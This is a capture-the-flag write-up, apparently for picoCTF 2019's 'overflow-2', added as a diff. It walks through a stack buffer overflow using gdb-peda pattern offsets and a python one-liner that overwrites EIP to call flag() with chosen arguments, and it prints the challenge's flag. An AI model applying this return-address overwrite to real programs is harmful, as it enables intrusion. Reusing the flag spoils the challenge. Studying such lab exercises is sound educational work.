@@ -1,0 +1,63 @@
+Looking at the source code, we can see that we need to call the flag() function with the arguments 0xDEADBEEF and 0xC0DED00D.
+
+Opening up gdb, we can find the address of the flag function:
+
+$ gdb ./vuln
+gdb-peda$ p flag
+$1 = {<text variable, no debug info>} 0x80485e6 <flag>
+
+Now, we need to find out how many bytes we need to write to in order to overwrite EIP.
+Using patterns, we can generate a 300 character string and search for the offset that overwrites EIP.
+
+gdb-peda$ pattern_create 300 payload
+Writing pattern of 300 chars to filename "payload"
+gdb-peda$ r < payload
+[----------------------------------registers-----------------------------------]
+EAX: 0x12d
+EBX: 0x76414158 ('XAAv')
+ECX: 0xf7fa2dc7 --> 0xfa38900a
+EDX: 0xf7fa3890 --> 0x0
+ESI: 0xf7fa2000 --> 0x1d7d6c
+EDI: 0x0
+EBP: 0x41594141 ('AAYA')
+ESP: 0xffffcf70 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+EIP: 0x41417741 ('AwAA')
+EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x41417741
+[------------------------------------stack-------------------------------------]
+0000| 0xffffcf70 ("ZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0004| 0xffffcf74 ("AAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0008| 0xffffcf78 ("AzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0012| 0xffffcf7c ("%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0016| 0xffffcf80 ("A%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0020| 0xffffcf84 ("%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0024| 0xffffcf88 ("nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+0028| 0xffffcf8c ("A%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x41417741 in ?? ()
+gdb-peda$ pattern_offset AwAA
+AwAA found at offset: 188
+
+Since this offset is at 188, we know that we need to send 188 characters before we can execute the code that we want.
+
+Additionally, we pack the address of flag, 4 random bytes as a fake return address, and finally the arguments.
+
+The stack will look something like this:
+| 0xc0ded00d <arg2>                |
+| 0xdeadbeef <arg1>                |
+| 0x41414141 <fake return address> |
+| 0x080485e6 <address of flag>     |
+| 0x41414141 <fake old %ebp>       |
+| 0x41414141 ...                   |
+|   ... (0x6c bytes of 'A's)       |
+|   ... 0x41414141                 |
+
+Putting it all together, we get the following:
+
+james9909@pico-2019-shell1:/problems/overflow-2_4_bbfcc061b1e9e5e8a7e313593365d434$ python -c "print 'A'*188 + '\xe6\x85\x04\x08' + 'AAAA' + '\xef\xbe\xad\xde' + '\x0d\xd0\xde\xc0'" | ./vuln
+Please enter your string:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÐÞÀAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭÞ
+picoCTF{arg5_and_r3turn598632d70}Segmentation fault (core dumped)
